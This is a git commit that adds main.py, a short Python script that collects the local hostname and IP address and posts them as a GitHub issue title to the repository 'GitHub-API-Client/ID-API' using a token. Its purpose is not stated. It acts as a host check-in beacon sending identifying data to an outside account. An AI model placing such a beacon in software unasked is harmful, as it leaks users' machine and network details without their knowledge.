c62c542c136f2badf9d94d3cf1f58b22b19bc735
D4RKH0R1Z0N <drkhrznorginal@gmail.com>
2022-03-24 16:47:22 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,18 @@
+# Made by D4RKH0R1Z0N (C)
+# GitHub-API-Client Account is owned by D4RKH0R1Z0N
+
+import socket
+import requests
+import json
+
+token = "*****************" # Enter GitHub token here
+h_name = socket.gethostname()
+IP_address = socket.gethostbyname(h_name)
+headers = {"Authorization" : "token {}".format(token)}
+data = {"title": h_name + " - " + IP_address}
+
+username = "GitHub-API-Client"
+Repositoryname = "ID-API"
+url = "https://api.github.com/repos/{}/{}/issues".format(username,Repositoryname)
+
+requests.post(url,data=json.dumps(data),headers=headers)
